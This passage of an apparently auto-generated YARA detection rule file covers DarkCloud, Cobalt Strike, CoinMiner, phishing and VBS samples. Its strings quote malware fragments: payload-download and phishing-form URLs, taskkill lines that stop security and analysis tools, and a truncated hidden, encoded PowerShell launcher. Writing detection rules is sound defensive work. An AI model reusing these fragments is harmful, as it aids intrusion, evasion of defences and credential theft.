      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_375229df.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "375229df144b3fb0d0560d90b06aa7fe34825886069653a088fa4071476cf63e"
   strings:
      $s1 = "DataSyncPro.exe" fullword wide /* score: '22.00'*/
      $s2 = "ExecuteAllModules" fullword ascii /* score: '18.00'*/
      $s3 = "DataSyncPro, Version=4.1.2024.156, Culture=neutral, PublicKeyToken=null" fullword wide /* score: '16.00'*/
      $s4 = "PayloadManager" fullword ascii /* score: '13.00'*/
      $s5 = "IPayloadModule" fullword ascii /* score: '13.00'*/
      $s6 = ".NETFramework,Version=v4.8" fullword ascii /* score: '10.00'*/
      $s7 = ".NET Framework 4.8" fullword ascii /* score: '10.00'*/
      $s8 = "4.1.2024.3421" fullword wide /* score: '9.00'*/ /* hex encoded string 'A $4!' */
      $s9 = "GetModuleNames" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 90KB and
      all of them
}

rule DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__0eeb4d57 {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0eeb4d57.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0eeb4d57a938c639ea9d8c9bd557f8540ce29017414ba7801b4c15e42e4c08ed"
   strings:
      $s1 = "Qlvjtoxka.exe" fullword wide /* score: '22.00'*/
      $s2 = "https://www.arcon.com.pe/Nwrxnpckgvs.mp4" fullword wide /* score: '17.00'*/
      $s3 = "{bc215482-2ce2-4618-a5b0-fff3fc27017f}, PublicKeyToken=3e56350693f7355e" fullword wide /* score: '13.00'*/
      $s4 = ".NET Framework 4.6(" fullword ascii /* score: '10.00'*/
      $s5 = "Selected compression algorithm is not supported." fullword wide /* score: '10.00'*/
      $s6 = "Unsupported hash size." fullword wide /* score: '10.00'*/
      $s7 = "DecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s8 = "+7+8+=+>+?" fullword ascii /* score: '9.00'*/ /* hex encoded string 'x' */
      $s9 = "getBuffer" fullword wide /* score: '9.00'*/
      $s10 = "Unknown Header" fullword wide /* score: '9.00'*/
      $s11 = "SmartAssembly.Attributes" fullword ascii /* PEStudio Blacklist: strings */ /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule dae02f32a21e03ce65412f6e56942daa_imphash_ {
   meta:
      description = "_subset_batch - file dae02f32a21e03ce65412f6e56942daa(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cbee972115b129ed3ce366217321a6f431ab86d9bf61c90ef7d224f1004a672c"
   strings:
      $s1 = "newa.dll" fullword wide /* score: '23.00'*/
      $s2 = "newa, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" fullword wide /* score: '21.00'*/
      $s3 = "PayloadExecutor" fullword ascii /* score: '20.00'*/
      $s4 = ".NETFramework,Version=v4.8" fullword ascii /* score: '10.00'*/
      $s5 = ".NET Framework 4.8" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 70KB and
      all of them
}

rule DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ce7d5da8353623bddcb18be540adb1ef47faf19099f50679c5b75d15f315ee6c"
   strings:
      $s1 = "Zyipids.exe" fullword wide /* score: '22.00'*/
      $s2 = "https://www.gugaequiposyservicios.com.mx/Gpkmo.wav" fullword wide /* score: '17.00'*/
      $s3 = "DZyipids, Version=1.0.1735.6187, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s4 = "decryptor" fullword wide /* score: '15.00'*/
      $s5 = "DownloadCompletedEventArgs" fullword ascii /* score: '13.00'*/
      $s6 = "Decryptor3Des" fullword ascii /* score: '11.00'*/
      $s7 = "get_DecryptedData" fullword ascii /* score: '11.00'*/
      $s8 = "PipelineHandlers" fullword ascii /* score: '10.00'*/
      $s9 = "add_DecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s10 = "remove_DecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s11 = "DecryptionCompletedEventArgs" fullword ascii /* score: '9.00'*/
      $s12 = "OnDecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s13 = "DecryptionCompleted" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 30KB and
      8 of them
}

rule DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__a37cae74 {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a37cae74.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a37cae74766a2ba4ad58f81885ac4cd8ef9adfcb904f31be5ff2b68436ca934d"
   strings:
      $s1 = "Atktsd.exe" fullword wide /* score: '22.00'*/
      $s2 = "https://www.gugaequiposyservicios.com.mx/Peqrxb.mp3" fullword wide /* score: '17.00'*/
      $s3 = "DAtktsd, Version=1.0.4749.29611, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s4 = "decryptor" fullword wide /* score: '15.00'*/
      $s5 = "DownloadCompletedEventArgs" fullword ascii /* score: '13.00'*/
      $s6 = "Decryptor3Des" fullword ascii /* score: '11.00'*/
      $s7 = "get_DecryptedData" fullword ascii /* score: '11.00'*/
      $s8 = "PipelineHandlers" fullword ascii /* score: '10.00'*/
      $s9 = "add_DecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s10 = "remove_DecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s11 = "DecryptionCompletedEventArgs" fullword ascii /* score: '9.00'*/
      $s12 = "OnDecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s13 = "DecryptionCompleted" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 30KB and
      8 of them
}

rule DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__52f5f927 {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_52f5f927.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "52f5f927713b8925fc1a83cbcfc8c23cd99eb67b17558e70b00baec2156fe401"
   strings:
      $s1 = "NCryptSharp.SCryptSubset, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '28.00'*/
      $s2 = "Kvkjnboybk.exe" fullword wide /* score: '22.00'*/
      $s3 = "_TemplateLoggerData" fullword ascii /* score: '21.00'*/
      $s4 = "CryptSharp.Processing" fullword ascii /* score: '18.00'*/
      $s5 = "GKvkjnboybk, Version=1.0.8654.2884, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s6 = "ProcessSortedProcessor" fullword ascii /* score: '15.00'*/
      $s7 = "ExtendedProcessor" fullword ascii /* score: '15.00'*/
      $s8 = "ProcessAttachedProcessor" fullword ascii /* score: '15.00'*/
      $s9 = "HandleTransformableProcessor" fullword ascii /* score: '15.00'*/
      $s10 = "_ReadableTemplateVol" fullword ascii /* score: '14.00'*/
      $s11 = "CryptSharp.Templating" fullword ascii /* score: '14.00'*/
      $s12 = "GetNextPortableFinalizer" fullword ascii /* score: '12.00'*/
      $s13 = "GetNextConfigurableTracker" fullword ascii /* score: '12.00'*/
      $s14 = "GenerateAccessibleTemplate" fullword ascii /* score: '11.00'*/
      $s15 = "GenerateIsolatedTemplate" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule ebdd1fce9687ffef3c240d9166cfec312e147c6ea1b0fa6e48d44e4a2afd0c84_ebdd1fce {
   meta:
      description = "_subset_batch - file ebdd1fce9687ffef3c240d9166cfec312e147c6ea1b0fa6e48d44e4a2afd0c84_ebdd1fce.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ebdd1fce9687ffef3c240d9166cfec312e147c6ea1b0fa6e48d44e4a2afd0c84"
   strings:
      $s1 = "  <assemblyIdentity name=\"Installer.application\" version=\"2.0.0.4\" publicKeyToken=\"0000000000000000\" language=\"en-US\" pr" ascii /* score: '28.00'*/
      $s2 = "      <assemblyIdentity name=\"Installer.exe\" version=\"2.0.0.4\" publicKeyToken=\"0000000000000000\" language=\"en-US\" proces" ascii /* score: '27.00'*/
      $s3 = "      <assemblyIdentity name=\"Installer.exe\" version=\"2.0.0.4\" publicKeyToken=\"0000000000000000\" language=\"en-US\" proces" ascii /* score: '27.00'*/
      $s4 = "  <description asmv2:publisher=\"Rainway, Inc.\" co.v1:suiteName=\"Rainway\" asmv2:product=\"Rainway\" asmv2:supportUrl=\"https:" ascii /* score: '26.00'*/
      $s5 = "  <assemblyIdentity name=\"Installer.application\" version=\"2.0.0.4\" publicKeyToken=\"0000000000000000\" language=\"en-US\" pr" ascii /* score: '25.00'*/
      $s6 = "ay.com/support/\" co.v1:errorReportUrl=\"https://status.rainway.com/\" xmlns=\"urn:schemas-microsoft-com:asm.v1\" />" fullword ascii /* score: '20.00'*/
      $s7 = "    <framework targetVersion=\"4.5\" profile=\"Full\" supportedRuntime=\"4.0.30319\" />" fullword ascii /* score: '18.00'*/
      $s8 = "  <description asmv2:publisher=\"Rainway, Inc.\" co.v1:suiteName=\"Rainway\" asmv2:product=\"Rainway\" asmv2:supportUrl=\"https:" ascii /* score: '16.00'*/
      $s9 = "com:asm.v3\" xmlns:dsig=\"http://www.w3.org/2000/09/xmldsig#\" xmlns:co.v1=\"urn:schemas-microsoft-com:clickonce.v1\" xmlns:co.v" ascii /* score: '13.00'*/
      $s10 = "  </compatibleFrameworks>" fullword ascii /* score: '10.00'*/
      $s11 = "  <compatibleFrameworks xmlns=\"urn:schemas-microsoft-com:clickonce.v2\">" fullword ascii /* score: '10.00'*/
      $s12 = "rml=\"urn:mpeg:mpeg21:2003:01-REL-R-NS\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:asmv3=\"urn:schemas-micro" ascii /* score: '10.00'*/
      $s13 = "<asmv1:assembly xsi:schemaLocation=\"urn:schemas-microsoft-com:asm.v1 assembly.adaptive.xsd\" manifestVersion=\"1.0\" xmlns:asmv" ascii /* score: '9.00'*/
      $s14 = "<asmv1:assembly xsi:schemaLocation=\"urn:schemas-microsoft-com:asm.v1 assembly.adaptive.xsd\" manifestVersion=\"1.0\" xmlns:asmv" ascii /* score: '9.00'*/
      $s15 = "    <deploymentProvider codebase=\"https://cdn.amazon-us54.com/rainway/Installer.application\" />" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xbbef and filesize < 6KB and
      8 of them
}

rule ceeefe0bb6c2e0f7cef782241a64a416a45a1283f9fd90023f8ad6772a1fa02f_ceeefe0b {
   meta:
      description = "_subset_batch - file ceeefe0bb6c2e0f7cef782241a64a416a45a1283f9fd90023f8ad6772a1fa02f_ceeefe0b.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ceeefe0bb6c2e0f7cef782241a64a416a45a1283f9fd90023f8ad6772a1fa02f"
   strings:
      $x1 = "batchFile.WriteLine \"taskkill /f /im Procdump64a.exe\"" fullword ascii /* score: '36.00'*/
      $x2 = "batchFile.WriteLine \"taskkill /f /im Procdump64.exe\"" fullword ascii /* score: '36.00'*/
      $x3 = "batchFile.WriteLine \"taskkill /f /im Procdump.exe\"" fullword ascii /* score: '36.00'*/
      $x4 = "batchFile.WriteLine \"taskkill /f /im procdump64a.exe\"" fullword ascii /* score: '36.00'*/
      $x5 = "batchFile.WriteLine \"taskkill /f /im procdump.exe\"" fullword ascii /* score: '36.00'*/
      $x6 = "batchFile.WriteLine \"taskkill /f /im procdump64.exe\"" fullword ascii /* score: '36.00'*/
      $x7 = "batchFile.WriteLine \"taskkill /f /im dumpcap.exe\"" fullword ascii /* score: '32.00'*/
      $s8 = "batchPath = shell.ExpandEnvironmentStrings(\"%TEMP%\\AntiToolKiller.bat\")" fullword ascii /* score: '30.00'*/
      $s9 = "batchFile.WriteLine \"taskkill /f /im x86dbg.exe\"" fullword ascii /* score: '26.00'*/
      $s10 = "batchFile.WriteLine \"taskkill /f /im procmon64.exe\"" fullword ascii /* score: '26.00'*/
      $s11 = "batchFile.WriteLine \"taskkill /f /im SecHealthUI.exe\"" fullword ascii /* score: '26.00'*/
      $s12 = "batchFile.WriteLine \"taskkill /f /im Procmon64.exe\"" fullword ascii /* score: '26.00'*/
      $s13 = "batchFile.WriteLine \"taskkill /f /im procmon86.exe\"" fullword ascii /* score: '26.00'*/
      $s14 = "batchFile.WriteLine \"taskkill /f /im Wireshark.exe\"" fullword ascii /* score: '26.00'*/
      $s15 = "batchFile.WriteLine \"taskkill /f /im procexp64.exe\"" fullword ascii /* score: '26.00'*/
   condition:
      uint16(0) == 0x6553 and filesize < 4KB and
      1 of ($x*) and all of them
}

rule cfb2c7f1b13b95d5620754f168a2088f335e62d1e009ff2b572b67fb28357027_cfb2c7f1 {
   meta:
      description = "_subset_batch - file cfb2c7f1b13b95d5620754f168a2088f335e62d1e009ff2b572b67fb28357027_cfb2c7f1.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cfb2c7f1b13b95d5620754f168a2088f335e62d1e009ff2b572b67fb28357027"
   strings:
      $s1 = "I15896VS.lnkUT" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 3KB and
      all of them
}

rule cfd338c16249e9bcae69b3c3a334e6deafd5a22a84935a76b390a9d02ed2d032_cfd338c1 {
   meta:
      description = "_subset_batch - file cfd338c16249e9bcae69b3c3a334e6deafd5a22a84935a76b390a9d02ed2d032_cfd338c1.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cfd338c16249e9bcae69b3c3a334e6deafd5a22a84935a76b390a9d02ed2d032"
   strings:
      $s1 = "SAMAmA}Ac" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 9000KB and
      all of them
}

rule Cobalt_Strike_signature_ {
   meta:
      description = "_subset_batch - file Cobalt Strike(signature).bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b7c30801d6febaea892b7c62e725338fba7cb2a7d2ade94a451445b9351a4cee"
   strings:
      $x1 = "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAe" ascii /* score: '34.00'*/
      $x2 = "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAe" ascii /* score: '34.00'*/
      $s3 = "ADAAbAB5AD" ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s4 = "QApACkAKQAsAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAY" ascii /* score: '11.00'*/
      $s5 = "gAyAE0AMwBUAHsAMQB9ADMAOQAzACsALwBNAG8AOABrAG8AOABuAGMAegBaADAAMABsAGkAegBhADMAVgBYAFYAMQBWADkALwA5AFMARABjAFoARAA1AEwAYQBNAFoAb" ascii /* score: '11.00'*/
      $s6 = "wBPAEYAZABUAGYAdABOAHAAdgBOAGgAdwBEADEAYgAwAGsAZwBLAHoAUgBvAGsAUQAxAHkASgA5AFQAVwAvAEYAUgBwAE4AbAAwAGoAWQBMAFkAagBtAHIAYgB6AGUAe" ascii /* score: '11.00'*/
      $s7 = "ABIAGMAdgB2ADAARwBvADIAaQBHAG8ASwBPAHIAYwBlAEEATwBSADYAdABjADUAQwB5AE8AQwBnAHoAbwBuAFoAMABWAHkAVwBaAEkAMwBqAEoANgBHADEAVgBkADMAa" ascii /* score: '11.00'*/
      $s8 = "QBaAGIAeQBjAHUAUQArAFQAaQBUAEIAUQBEAGMARABpAHUAVAAwAFIAVABUAGQAbwBHADgASgA2AE8ANwBXAFYALwBKAG4ARQByAFoAawBZAFAATQA3AFUAdwBXADMAZ" ascii /* score: '11.00'*/
      $s9 = "wBDAE0ATQByAGUAOABKAG8AUAAzAGkASABQADYAOABUADEAMgBkACsAVwBzAEgAZwBNAGoAJwAnACsAJwAnACsAbQBSAFgASgBTAC8AbwBNAFQAJwAnACsAJwAnADYAc" ascii /* score: '11.00'*/
      $s10 = "QBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQ" ascii /* score: '11.00'*/
      $s11 = "gB0ADQAdQBzAGoAMQAxAHEAZgBjAGUAYgBGADIATgBJAHMATQBlAGgAQQBhADUAMwAzACsAeQBGAE0AWABYAGwARwBMAG0AQgBtAFMANgBZAHUAdQBnAGMAeQA4AGEAU" ascii /* score: '11.00'*/
      $s12 = "wBoADQAYgBhAFkAcQBUAE4AawBpAGYASQBlAGUAMgB3AEEAKwArAHUAUAB7ADEAfQB3AGwAOQA3AGkAcQBEAFIAMABHADEAZwB0AFYAZwBQADAAbQBaAFAAZQBtAHQAW" ascii /* score: '11.00'*/
      $s13 = "gBLAGMAZgBQAHkAVwB6AFoAcgAvADUANABBADMAMgB7ADEAfQBLAFIAeQBkADAAaABqAEYAYwA0AHIAQgByAGEAYgBMAG4AUABYAGsAagA3AEEAbQBvAGUAaQBkAFkAa" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x4325 and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule eee5c4d3143e32e6f5ceb90f169fc9733cd68d7944c97a9a8b4ffaa8158f3db3_eee5c4d3 {
   meta:
      description = "_subset_batch - file eee5c4d3143e32e6f5ceb90f169fc9733cd68d7944c97a9a8b4ffaa8158f3db3_eee5c4d3.html"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "eee5c4d3143e32e6f5ceb90f169fc9733cd68d7944c97a9a8b4ffaa8158f3db3"
   strings:
      $x1 = "<header style='background-image: url(data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAlgCWAAD/2wBDAAIBAQIBAQICAgICAgICAwUDAwMDAwYEBAMF" ascii /* score: '36.00'*/
      $s2 = "<P></P><form method=post action=\"https://ppkservice.com/wp-content/cm/access.php\"><div style=\"font-size: 10px; width: 70%; ma" ascii /* score: '30.00'*/
      $s3 = "<P></P><form method=post action=\"https://ppkservice.com/wp-content/cm/access.php\"><div style=\"font-size: 10px; width: 70%; ma" ascii /* score: '30.00'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '25.00'*/
      $s9 = "AAAAAAAAAAAAAAAAAAAAAAAA7" ascii /* base64 encoded string  */ /* score: '25.00'*/
      $s10 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA7" ascii /* base64 encoded string  */ /* score: '25.00'*/
      $s11 = "aAAAAAAAAAAAAAAAA" ascii /* base64 encoded string*/ /* score: '24.00'*/
      $s12 = "r0T9jkYRpbbMGg7Ojp440/ZDLNk8BsnggHydSRysRHNRUNH0EMjUR0bVRPhsfYAcV9mpnqirCzp+x9WUUUSpysam3gh9QARNgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* score: '24.00'*/
      $s13 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string*/ /* score: '22.00'*/
      $s14 = "4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s15 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA3QAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string*/ /* score: '21.00'*/
   condition:
      uint16(0) == 0x683c and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule CoinMiner_signature__d400a6a867a8623e410a8599e61fe849_imphash__3db1ae8b {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_d400a6a867a8623e410a8599e61fe849(imphash)_3db1ae8b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3db1ae8ba05612596b503cc3e3da63dc866cb3c1a50a68f107cc0c3462d86233"
   strings:
      $s1 = "c:\\miniprojects\\x86il\\il86\\x64\\release\\IL86.pdb" fullword ascii /* score: '22.00'*/
      $s2 = "PROC_OUT = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s3 = "n4PROC_IN = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s4 = "/dumpstatus" fullword ascii /* score: '14.00'*/
      $s5 = "Please, contact the software developers with the following codes. Thank you. (version %d.%d.%d)" fullword ascii /* score: '10.00'*/
      $s6 = "WinLicenseDriverVersion" fullword ascii /* score: '10.00'*/
      $s7 = "GOrr:\"" fullword ascii /* score: '10.00'*/
      $s8 = "C:\\;vC-6" fullword ascii /* score: '10.00'*/
      $s9 = "/logstatus" fullword ascii /* score: '9.00'*/
      $s10 = "/getwlstatus" fullword ascii /* score: '9.00'*/
      $s11 = "* xBUK" fullword ascii /* score: '9.00'*/
      $s12 = "* !Gzs:" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 19000KB and
      8 of them
}

rule CoinMiner_signature__d400a6a867a8623e410a8599e61fe849_imphash__4193a9ca {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_d400a6a867a8623e410a8599e61fe849(imphash)_4193a9ca.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4193a9caad8724b1d07916dece9dad379c8c30c6063a920472ee2e28fd89cc66"
   strings:
      $s1 = "c:\\miniprojects\\x86il\\il86\\x64\\release\\IL86.pdb" fullword ascii /* score: '22.00'*/
      $s2 = "PROC_OUT = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s3 = "PROC_IN = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s4 = "/dumpstatus" fullword ascii /* score: '14.00'*/
      $s5 = "WinLicenseDriverVersion" fullword ascii /* score: '10.00'*/
      $s6 = "OPlease, contact the software developers with the following codes. Thank you. (version %d.%d.%d)" fullword ascii /* score: '10.00'*/
      $s7 = "/logstatus" fullword ascii /* score: '9.00'*/
      $s8 = "/getwlstatus" fullword ascii /* score: '9.00'*/
      $s9 = "* ATG0a" fullword ascii /* score: '9.00'*/
      $s10 = "NfZyH- " fullword ascii /* score: '8.00'*/
      $s11 = "qboeobgjl" fullword ascii /* score: '8.00'*/
      $s12 = "nbwdnbh" fullword ascii /* score: '8.00'*/
      $s13 = "nbownbo" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 19000KB and
      8 of them
}

rule CoinMiner_signature__d400a6a867a8623e410a8599e61fe849_imphash__9103a0b5 {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_d400a6a867a8623e410a8599e61fe849(imphash)_9103a0b5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9103a0b5652586ce38edbea260e1a29ffce189b5627629935f17c851505dccf0"
   strings:
      $s1 = "c:\\miniprojects\\x86il\\il86\\x64\\release\\IL86.pdb" fullword ascii /* score: '22.00'*/
      $s2 = "PROC_OUT = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s3 = "PROC_IN = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s4 = "/dumpstatus" fullword ascii /* score: '14.00'*/
      $s5 = "Please, contact the software developers with the following codes. Thank you. (version %d.%d.%d)" fullword ascii /* score: '10.00'*/
      $s6 = "WinLicenseDriverVersion" fullword ascii /* score: '10.00'*/
      $s7 = "chCr.ozz`MS" fullword ascii /* score: '10.00'*/
      $s8 = "/logstatus" fullword ascii /* score: '9.00'*/
      $s9 = "W;0/getwlstatus" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 21000KB and
      all of them
}

rule CoinMiner_signature__d400a6a867a8623e410a8599e61fe849_imphash__97324eed {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_d400a6a867a8623e410a8599e61fe849(imphash)_97324eed.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "97324eed2e8553b867b2b93a11dc38806d49fa8930641c3d934cb016eabccca7"
   strings:
      $s1 = "c:\\miniprojects\\x86il\\il86\\x64\\release\\IL86.pdb" fullword ascii /* score: '22.00'*/
      $s2 = "PROC_OUT = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s3 = "VPROC_IN = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s4 = "/dumpstatus" fullword ascii /* score: '14.00'*/
      $s5 = "WinLicenseDriverVersion" fullword ascii /* score: '10.00'*/
      $s6 = "kPlease, contact the software developers with the following codes. Thank you. (version %d.%d.%d)" fullword ascii /* score: '10.00'*/
      $s7 = "/logstatus" fullword ascii /* score: '9.00'*/
      $s8 = "/getwlstatus" fullword ascii /* score: '9.00'*/
      $s9 = "y/hgLoG:-" fullword ascii /* score: '9.00'*/
      $s10 = "mDDeyEr" fullword ascii /* score: '9.00'*/
      $s11 = "CwxV* L6}" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 19000KB and
      8 of them
}

rule CoinMiner_signature__d400a6a867a8623e410a8599e61fe849_imphash__c0d87f17 {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_d400a6a867a8623e410a8599e61fe849(imphash)_c0d87f17.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c0d87f17dfc899826b094dd0dbc08d2ee2f12e20677caea0cbd0d284b7a665fc"
   strings:
      $s1 = "c:\\miniprojects\\x86il\\il86\\x64\\release\\IL86.pdb" fullword ascii /* score: '22.00'*/
      $s2 = "PROC_OUT = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s3 = "?^PROC_IN = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s4 = "/dumpstatus" fullword ascii /* score: '14.00'*/
      $s5 = "Please, contact the software developers with the following codes. Thank you. (version %d.%d.%d)" fullword ascii /* score: '10.00'*/
      $s6 = ")WinLicenseDriverVersion" fullword ascii /* score: '10.00'*/
      $s7 = "/logstatus" fullword ascii /* score: '9.00'*/
      $s8 = "/getwlstatus" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 19000KB and
      all of them
}

rule CoinMiner_signature__d400a6a867a8623e410a8599e61fe849_imphash__d7e66623 {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_d400a6a867a8623e410a8599e61fe849(imphash)_d7e66623.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d7e666238b0fb7e22aafd0facda64e98ff1613265b7fa954580e3d0553ee4334"
   strings:
      $s1 = "c:\\miniprojects\\x86il\\il86\\x64\\release\\IL86.pdb" fullword ascii /* score: '22.00'*/
      $s2 = "PROC_OUT = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s3 = "PROC_IN = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s4 = "/dumpstatus" fullword ascii /* score: '14.00'*/
      $s5 = "GODBXODBhODBxODB" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s6 = "WinLicenseDriverVersion" fullword ascii /* score: '10.00'*/
